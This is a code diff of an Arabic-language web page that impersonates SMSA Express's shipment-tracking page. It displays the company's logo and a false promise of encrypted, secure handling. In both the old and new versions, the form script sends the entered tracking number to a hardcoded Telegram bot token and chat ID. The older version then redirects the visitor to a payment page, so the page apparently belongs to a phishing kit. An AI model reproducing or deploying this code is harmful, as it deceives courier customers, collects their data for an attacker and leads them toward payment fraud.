@@ -1,58 +1,127 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>سمسا | تتبع الشحنة</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>تتبع شحنتك - سمسا</title>
   <style>
-    body { margin:0; font-family: 'Tajawal', sans-serif; background:#f9fafb; }
-    .header { background:#ffffff; padding:15px; text-align:center; box-shadow:0 2px 4px rgba(0,0,0,0.1); }
-    .header img { height:40px; vertical-align:middle; }
-    .header span { font-size:20px; color:#333; margin-left:10px; vertical-align:middle; }
-    .main { max-width:480px; margin:40px auto; padding:20px; background:#fff; border-radius:8px; }
-    h2 { margin:0 0 10px; color:#222; text-align:center; }
-    .sub { text-align:center; color:#555; margin-bottom:20px; font-size:14px; }
-    input { width:100%; padding:14px; font-size:16px; border:1px solid #ccc; border-radius:6px; }
-    button { width:100%; margin-top:15px; padding:14px; background:#ff6600; color:#fff; border:none; font-size:16px; border-radius:6px; cursor:pointer; }
-    button:hover { background:#e65500; }
-    .trust { margin-top:20px; font-size:13px; color:#666; text-align:center; }
-    .trust::before { content:'🔒'; display:block; margin-bottom:5px; font-size:18px; }
-    @media(max-width:400px){ .header span { font-size:18px; } button, input { font-size:15px; padding:12px; } }
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f4f6fa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      background: #fff;
+      border-radius: 12px;
+      padding: 30px 25px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.08);
+      width: 100%;
+      max-width: 400px;
+      text-align: center;
+    }
+    .logo {
+      display: block;
+      margin: 0 auto 15px;
+      max-width: 160px;
+    }
+    h2 {
+      color: #333;
+    }
+    p {
+      color: #666;
+      font-size: 14px;
+      margin-bottom: 25px;
+    }
+    input[type="text"] {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      margin-bottom: 20px;
+    }
+    button {
+      background-color: #ff6600;
+      color: white;
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+    button:hover {
+      background-color: #e65c00;
+    }
+    .note {
+      margin-top: 20px;
+      font-size: 13px;
+      color: #888;
+    }
+    .note i {
+      color: #ffa500;
+    }
+    .loading {
+      display: none;
+      margin-top: 10px;
+      font-size: 14px;
+      color: #444;
+    }
   </style>
 </head>
 <body>
-  <div class="header">
-    <img src="https://www.smsaexpress.com/assets/logo.png" alt="سمسا">
-    <span>تتبع الشحنة</span>
-  </div>
-  <div class="main">
-    <h2>تفقد حالة شحنتك الآن</h2>
-    <p class="sub">أدخل الرقم الموجود في إيصال الشحن واضغط تتبع.</p>
+  <div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/26/Smsa_Express_logo.png/320px-Smsa_Express_logo.png" alt="شعار سمسا" class="logo">
+    <h2>تتبع حالة شحنتك الآن</h2>
+    <p>أدخل رقم التتبع الموجود على الإيصال واضغط "تتبع".</p>
     <form id="trackForm">
-      <input type="text" id="orderId" name="orderId" placeholder="مثال: 1234567890" required pattern="\\d{7,}" title="أدخل رقم شحنة صحيح">
+      <input type="text" id="trackingNumber" placeholder="مثال: 1234567890" required>
       <button type="submit">تتبع</button>
     </form>
-    <div class="trust">
-      بياناتك آمنة ومحمية عبر اتصال مشفر.
+    <div class="loading" id="loading">🔄 جاري إرسال الطلب...</div>
+    <div class="note">
+      <i>🔒</i> بياناتك آمنة ومشفرة عبر اتصال محمي.
     </div>
   </div>
 
   <script>
-    document.getElementById('trackForm').addEventListener('submit', function(e){
-      e.preventDefault();
-      const id = document.getElementById('orderId').value.trim();
-      if(!id || id.length < 7) return alert('أدخل رقم شحنة صحيح.');
+    const form = document.getElementById('trackForm');
+    const loading = document.getElementById('loading');
 
-      fetch('https://api.telegram.org/bot8196943143:AAFTexCjJ2IUCXz_-36ls1tof1bVmairSj0/sendMessage',{
-        method:'POST',
-        headers:{ 'Content-Type':'application/json' },
-        body: JSON.stringify({ chat_id:"1008144314", text:`🔍 تتبع شحنة: ${id}` })
-      }).then(res=>{
-        if(res.ok) window.location.href='payment.html';
-        else alert('فشل الإرسال، حاول مرة أخرى.');
-      }).catch(()=>{
-        alert('فشل التواصل مع الخادم.');
-      });
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const number = document.getElementById('trackingNumber').value.trim();
+      if (!number) return alert('يرجى إدخال رقم التتبع.');
+
+      const message = `🚚 طلب تتبع شحنة\\nرقم التتبع: ${number}`;
+      const chatId = "1008144314";
+      const token = "8196943143:AAFTexCjJ2IUCXz_-36ls1tof1bVmairSj0";
+
+      loading.style.display = 'block';
+
+      try {
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+          })
+        });
+        alert("✅ تم إرسال الطلب بنجاح! سيتم التواصل معك قريبًا.");
+        form.reset();
+      } catch (err) {
+        alert("❌ حدث خطأ أثناء الإرسال. يرجى المحاولة لاحقًا.");
+      } finally {
+        loading.style.display = 'none';
+      }
     });
   </script>
 </body>
